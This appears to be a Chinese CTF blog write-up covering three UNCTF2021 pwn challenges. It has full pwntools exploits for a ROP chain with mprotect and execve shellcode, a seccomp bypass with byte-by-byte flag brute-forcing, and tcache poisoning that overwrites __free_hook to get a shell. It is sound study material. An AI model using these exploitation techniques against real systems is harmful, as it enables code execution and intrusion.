@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Cyyyber" />
+
+
+
+<meta name="description" content="题目总体比较简单，就挑三道相比没那么简单的题详细讲一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UNCTF2021pwn-wp">
+<meta property="og:url" content="http://cyyyber.icu/2021/12/07/UNCTF2021pwn-wp/index.html">
+<meta property="og:site_name" content="Cyyyber&#39;s Blog">
+<meta property="og:description" content="题目总体比较简单，就挑三道相比没那么简单的题详细讲一下">
+<meta property="og:locale">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWYHx.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWUUK.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWgVP.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWR58.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaW5vj.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWqaV.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWXPU.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/12/03/oaWv24.png">
+<meta property="article:published_time" content="2021-12-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-27T03:13:58.179Z">
+<meta property="article:author" content="Cyyyber">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z3.ax1x.com/2021/12/03/oaWYHx.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Cyyyber&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>UNCTF2021pwn-wp | Cyyyber&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/1.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:cyyyber@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/Cyyyyyber" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">源码分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/1.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:cyyyber@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Cyyyyyber" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-UNCTF2021pwn-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/12/07/UNCTF2021pwn-wp/" class="article-date">
+      <time datetime="2021-12-06T16:00:00.000Z" itemprop="datePublished">2021-12-07</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      UNCTF2021pwn-wp
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>题目总体比较简单，就挑三道相比没那么简单的题详细讲一下</p>
+<span id="more"></span>
+
+<h1 id="ezrop"><a href="#ezrop" class="headerlink" title="ezrop"></a>ezrop</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目很简单，就是一个栈溢出漏洞</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWYHx.png"></p>
+<p>开启了NX保护</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWUUK.png"></p>
+<p>但是给了mprotect函数</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWgVP.png"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>简单的栈溢出又开启了NX保护，就不能简单地写个shellcode到栈上，但是题目又没有system函数，所以还是得用shellcode，只要把shellcode所在的内存页用<code>mprotect</code>函数开启执行权限就行了。因为靶机开启了ASLR保护，所以栈的地址是动态变化的，又没有write函数能够泄露地址，所以我们无法得到栈的地址，把shellcode写到栈上这条路就行不通，只能另找地址来放shellcode。</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWR58.png"></p>
+<p>在0x600000的页上我们是有写到权限的，所以我们可以考虑把shellcode写到0x600000的页上。首先利用栈溢出构造rop链再次调用read函数来读取shellcode放到0x600000的页上，并把栈迁移到0x600000的页上，这样我们就又能构造rop链来执行<code>mprotect</code>函数开启0x600000的页的执行权限，然后执行shellcode。</p>
+<p>这里为了不影响程序运行，我们把第二个rop链读取到程序没有使用的0x600e00处</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x600e00</span></span><br><span class="line">call_mprotect = <span class="number">0x400671</span></span><br><span class="line">call_read = <span class="number">0x400651</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x4006DA</span></span><br><span class="line">mov_rdx_r13_call = <span class="number">0x4006C0</span></span><br><span class="line">r12 = buf_addr + <span class="number">0x48</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006e3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x4006e1</span></span><br><span class="line">shellcode_addr = buf_addr + <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(buf_addr)</span><br><span class="line">payload1 += p64(pop_rsi_pop_r15_ret) + p64(buf_addr) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(call_read)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(<span class="number">0x0</span>) * <span class="number">2</span> + p64(r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">payload2 += p64(mov_rdx_r13_call)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload2 += p64(pop_rsi_pop_r15_ret) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload2 += p64(call_mprotect)</span><br><span class="line">payload2 += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload2 += p64(shellcode_addr)</span><br><span class="line">payload2 += shellcode</span><br><span class="line"></span><br><span class="line">p.send(payload1.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line">p.send(payload2.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>这是一道seccomp的题，题目逻辑就是执行输入的0x18字节的shellcode</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaW5vj.png"></p>
+<p>用seccomp-tools查看syscall的过滤规则，可以看到只允许<code>read</code>、<code>open</code>、<code>mprotect</code>三个系统调用</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWqaV.png"></p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>题目只能输入0x18字节的shellcode，这肯定是远远不够的，所以我们先用这0x18个字节再执行一次<code>read</code>读入更多的shellcode，这段shellcode就可以用来读flag，把后读入的shellcode放到后面，就能一起执行。但是我们甚至都没有<code>write</code>函数，即使能读flag也无法输出出来。这里我采取的是爆破的方法，对读入内存的flag逐字节爆破，比较内存中的字符与传入的字符，如果相同就陷入死循环，用<code>recv</code>超时来判断是否相同。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_flag_by_byte</span>(<span class="params">p, offset, ch</span>):</span></span><br><span class="line"></span><br><span class="line">    code = asm(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rsi, 0x10300</span></span><br><span class="line"><span class="string">        mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">        mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">        cmp cl, dl</span></span><br><span class="line"><span class="string">        jz loop</span></span><br><span class="line"><span class="string">        xor edi, edi</span></span><br><span class="line"><span class="string">        push SYS_exit</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        jmp loop</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">    )</span><br><span class="line">    sh3 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">    sh3 += asm(shellcraft.read(<span class="number">3</span>, mmap + <span class="number">0x300</span>, <span class="number">0x100</span>))</span><br><span class="line">    sh3 += code</span><br><span class="line"></span><br><span class="line">    sh1 = asm(shellcraft.read(<span class="number">0</span>, mmap + <span class="number">0x18</span>, <span class="built_in">len</span>(sh3))).ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;master?\n&#x27;</span>, sh1)</span><br><span class="line"></span><br><span class="line">    p.send(sh3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">    offset = <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7E</span>+<span class="number">1</span>):</span><br><span class="line">        p = process(<span class="string">&#x27;./ezshell_new&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmp_flag_by_byte(p, offset, ch)</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find one byte in flag :&quot;</span>, flag)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;all done: flag is &quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Nnote"><a href="#Nnote" class="headerlink" title="Nnote"></a>Nnote</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>题目就是常规的note管理，提供了增删查改。漏洞点在<code>add</code>里面，size可以为0，这样在<code>edit</code>的时候就会造成溢出</p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWXPU.png"></p>
+<p><img src="https://z3.ax1x.com/2021/12/03/oaWv24.png"></p>
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>因为libc是2.31的，所以存在tcache，思路也很简单，如果我们能够溢出到已经在tcache中chunk，并且修改其next指针，就能伪造chunk，从而实现任意地址写，然后把<code>__free_hook</code>指针修改为<code>system</code>的地址，就能getshell。然而我们还需要泄露libc的地址，我们知道unsorted bin中的头尾两个chunk里是有libc地址的，所以只要申请8个0x80的chunk再释放，tcache链被填满之后就会有一个chunk进入到unsorted bin中，这时如果申请size为0的chunk（实际得到的chunk是0x20大小的），就会把unsorted bin的chunk从头部拆分出一个0x20的chunk，因为size为0，所以<code>add</code>中的<code>memset</code>函数不会清空chunk里的内容，这样我们就能读出chunk里的libc的地址。</p>
+<p>另外调试的时候可以利用glibc-all-in-one和patchelf两个工具修改程序的链接库到2.31的版本</p>
+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=  <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./Nnote&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#1-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    delete(i) <span class="comment">#fill the tcache</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;5.Exit&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebc60</span></span><br><span class="line">p.info(<span class="string">&#x27;libc leak &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) <span class="comment">#size</span></span><br><span class="line"></span><br><span class="line">payload += p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) <span class="comment">#overwrite next to __free_hook</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>) <span class="comment">#2: the fake chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])) <span class="comment">#overwrite __free_hook to system</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/11/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021pwn-wp/">
+                    西湖论剑2021pwn-wp
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezrop"><span class="toc-number">1.</span> <span class="toc-text">ezrop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezshell"><span class="toc-number">2.</span> <span class="toc-text">ezshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nnote"><span class="toc-number">3.</span> <span class="toc-text">Nnote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
